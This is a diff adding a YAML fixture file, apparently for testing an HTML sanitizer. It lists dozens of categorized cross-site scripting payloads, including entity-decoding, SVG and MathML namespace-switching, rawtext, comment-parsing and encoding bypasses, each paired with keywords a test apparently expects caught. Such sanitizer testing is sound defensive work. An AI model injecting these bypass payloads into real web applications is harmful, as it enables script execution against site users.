@@ -1,0 +1,359 @@
+category_map:
+  entity_decode:
+    - entity_script_basic
+    - entity_script_double
+    - entity_img_onerror
+    - entity_svg_onload
+    - entity_noscript
+    - entity_html_comment
+    - entity_textarea
+    - entity_xmp
+  namespace_switch:
+    - svg_script_direct
+    - svg_foreignobject
+    - svg_desc_script
+    - svg_title_script
+    - svg_animate_onbegin
+    - svg_set_onload
+    - svg_image_breaker
+    - svg_foreign_nested
+  mathml_inject:
+    - mathml_mtext_html
+    - mathml_annotation_xml
+    - mathml_annotation_svg
+    - mathml_mi_html
+    - mathml_mo_html
+    - mathml_mn_html
+    - mathml_ms_html
+    - mathml_form_escape
+  rawtext_abuse:
+    - noscript_double
+    - noscript_noscript
+    - textarea_double
+    - textarea_comment_break
+    - title_double
+    - style_svg_decode
+    - xmp_element
+    - listing_element
+    - iframe_noscript
+  comment_parse:
+    - comment_empty_break
+    - comment_dash_break
+    - comment_in_style
+    - comment_in_svg
+    - comment_in_mathml
+    - comment_malformed
+    - comment_in_textarea
+  template_deprecated:
+    - template_script
+    - template_nested
+    - details_ontoggle
+    - marquee_onstart
+    - isindex_action
+  encoding_tricks:
+    - backtick_attribute
+    - null_byte_tag
+    - tab_newline_bypass
+    - form_reorder
+    - table_flatten
+    - a_nested_table
+
+entity_payloads:
+  - - entity_script_basic
+    - "&lt;script&gt;alert(1)&lt;/script&gt;"
+    - entity_decode
+    - - "&lt;"
+      - "&gt;"
+      - script
+  - - entity_script_double
+    - "&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;"
+    - entity_decode
+    - - "&amp;lt;"
+      - script
+  - - entity_img_onerror
+    - "&lt;img src=x onerror=alert(1)&gt;"
+    - entity_decode
+    - - "&lt;"
+      - img
+      - onerror
+  - - entity_svg_onload
+    - "&lt;svg onload=alert(1)&gt;"
+    - entity_decode
+    - - "&lt;"
+      - svg
+      - onload
+  - - entity_noscript
+    - "&lt;noscript&gt;&lt;style&gt;&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;"
+    - entity_decode
+    - - "&lt;"
+      - noscript
+      - img
+  - - entity_html_comment
+    - "&lt;!--&gt;&lt;script&gt;alert(1)&lt;/script&gt;"
+    - entity_decode
+    - - "&lt;"
+      - script
+  - - entity_textarea
+    - "&lt;textarea&gt;&lt;script&gt;alert(1)&lt;/textarea&gt;"
+    - entity_decode
+    - - "&lt;"
+      - textarea
+      - script
+  - - entity_xmp
+    - "&lt;xmp&gt;&lt;script&gt;alert(1)&lt;/xmp&gt;"
+    - entity_decode
+    - - "&lt;"
+      - xmp
+      - script
+
+namespace_payloads:
+  - - svg_script_direct
+    - "<svg><script>alert(1)</script></svg>"
+    - svg_script
+    - - svg
+      - script
+  - - svg_foreignobject
+    - "<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>"
+    - svg_foreignobject
+    - - svg
+      - foreignObject
+      - onerror
+  - - svg_desc_script
+    - "<svg><desc><script>alert(1)</script></desc></svg>"
+    - svg_desc
+    - - svg
+      - desc
+      - script
+  - - svg_title_script
+    - "<svg><title><script>alert(1)</script></title></svg>"
+    - svg_title
+    - - svg
+      - title
+      - script
+  - - svg_animate_onbegin
+    - "<svg><animate onbegin=alert(1) attributeName=x dur=1s>"
+    - svg_animate
+    - - svg
+      - animate
+      - onbegin
+  - - svg_set_onload
+    - "<svg><set attributeName=onload to=alert(1)>"
+    - svg_set
+    - - svg
+      - set
+      - onload
+  - - svg_image_breaker
+    - "<svg><image href=\"data:image/svg+xml,&lt;script&gt;alert(1)&lt;/script&gt;\">"
+    - svg_image
+    - - svg
+      - image
+      - script
+  - - svg_foreign_nested
+    - "<svg><foreignObject><div><style><img src=x onerror=alert(1)></style></div></foreignObject></svg>"
+    - svg_foreign_nested
+    - - svg
+      - foreignObject
+      - style
+      - onerror
+
+mathml_payloads:
+  - - mathml_mtext_html
+    - "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>"
+    - mathml_mtext
+    - - math
+      - mtext
+      - mglyph
+      - onerror
+  - - mathml_annotation_xml
+    - "<math><annotation-xml encoding=\"text/html\"><img src=x onerror=alert(1)></annotation-xml></math>"
+    - mathml_annotation
+    - - math
+      - annotation-xml
+      - onerror
+  - - mathml_annotation_svg
+    - "<math><annotation-xml encoding=\"application/xhtml+xml\"><svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg></annotation-xml></math>"
+    - mathml_annotation_svg
+    - - math
+      - annotation-xml
+      - svg
+      - foreignObject
+  - - mathml_mi_html
+    - "<math><mi><img src=x onerror=alert(1)></mi></math>"
+    - mathml_mi
+    - - math
+      - mi
+      - onerror
+  - - mathml_mo_html
+    - "<math><mo><img src=x onerror=alert(1)></mo></math>"
+    - mathml_mo
+    - - math
+      - mo
+      - onerror
+  - - mathml_mn_html
+    - "<math><mn><img src=x onerror=alert(1)></mn></math>"
+    - mathml_mn
+    - - math
+      - mn
+      - onerror
+  - - mathml_ms_html
+    - "<math><ms><img src=x onerror=alert(1)></ms></math>"
+    - mathml_ms
+    - - math
+      - ms
+      - onerror
+  - - mathml_form_escape
+    - "<math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>"
+    - mathml_form
+    - - math
+      - mtext
+      - form
+      - onerror
+
+rawtext_payloads:
+  - - noscript_double
+    - "<noscript><style></noscript><img src=x onerror=alert(1)>"
+    - noscript_rawtext
+    - - noscript
+      - style
+      - onerror
+  - - noscript_noscript
+    - "<noscript><noscript><img src=x onerror=alert(1)></noscript></noscript>"
+    - noscript_nested
+    - - noscript
+      - img
+      - onerror
+  - - textarea_double
+    - "<textarea><script>alert(1)</script></textarea>"
+    - textarea_rawtext
+    - - textarea
+      - script
+  - - textarea_comment_break
+    - "<textarea><!--</textarea><script>alert(1)</script>-->"
+    - textarea_comment
+    - - textarea
+      - script
+  - - title_double
+    - "<title><script>alert(1)</script></title>"
+    - title_rawtext
+    - - title
+      - script
+  - - style_svg_decode
+    - "<svg><style><img src=x onerror=alert(1)></style></svg>"
+    - svg_style
+    - - svg
+      - style
+      - onerror
+  - - xmp_element
+    - "<xmp><script>alert(1)</script></xmp>"
+    - xmp_rawtext
+    - - xmp
+      - script
+  - - listing_element
+    - "<listing><script>alert(1)</script></listing>"
+    - listing_rawtext
+    - - listing
+      - script
+  - - iframe_noscript
+    - "<noscript><iframe></noscript><img src=x onerror=alert(1)>"
+    - noscript_iframe
+    - - noscript
+      - iframe
+      - onerror
+
+comment_payloads:
+  - - comment_empty_break
+    - "<!--><script>alert(1)</script>"
+    - comment_empty
+    - - "<!-->"
+      - script
+  - - comment_dash_break
+    - "<!---><script>alert(1)</script>"
+    - comment_dash
+    - - "<!--->"
+      - script
+  - - comment_in_style
+    - "<style><!--</style><script>alert(1)</script>--></style>"
+    - comment_style
+    - - style
+      - script
+  - - comment_in_svg
+    - "<svg><style><!--</style><script>alert(1)</script>--></style></svg>"
+    - comment_svg
+    - - svg
+      - style
+      - script
+  - - comment_in_mathml
+    - "<math><mtext><style><!--</style><img src=x onerror=alert(1)>"
+    - comment_mathml
+    - - math
+      - mtext
+      - onerror
+  - - comment_malformed
+    - "<!--><img src=x onerror=alert(1)>"
+    - comment_malformed
+    - - "<!-->"
+      - onerror
+  - - comment_in_textarea
+    - "<textarea><!--</textarea><img src=x onerror=alert(1)>"
+    - comment_textarea
+    - - textarea
+      - onerror
+
+template_payloads:
+  - - template_script
+    - "<template><script>alert(1)</script></template>"
+    - template_rawtext
+    - - template
+      - script
+  - - template_nested
+    - "<template><div><template><script>alert(1)</script></template></div></template>"
+    - template_nested
+    - - template
+      - script
+  - - details_ontoggle
+    - "<details open ontoggle=alert(1)>"
+    - details_event
+    - - details
+      - ontoggle
+  - - marquee_onstart
+    - "<marquee onstart=alert(1)>"
+    - marquee_event
+    - - marquee
+      - onstart
+  - - isindex_action
+    - "<isindex action=\"javascript:alert(1)\">"
+    - isindex_deprecated
+    - - isindex
+      - "javascript:"
+
+encoding_payloads:
+  - - backtick_attribute
+    - "<img src=`x`onerror=alert(1)>"
+    - backtick_quote
+    - - img
+      - onerror
+  - - null_byte_tag
+    - "<img src=x\x00onerror=alert(1)>"
+    - null_byte
+    - - img
+      - onerror
+  - - tab_newline_bypass
+    - "<scr\tipt>alert(1)</scr\tipt>"
+    - tab_in_tag
+    - - script
+  - - form_reorder
+    - "<form id=\"outer\"><div></form><form id=\"inner\"><input>"
+    - form_reorder
+    - - form
+      - input
+  - - table_flatten
+    - "<table><tr><td><style><img src=x onerror=alert(1)>"
+    - table_flatten
+    - - table
+      - style
+      - onerror
+  - - a_nested_table
+    - "<a id=1><table><a id=2>"
+    - anchor_table
+    - - a
+      - table
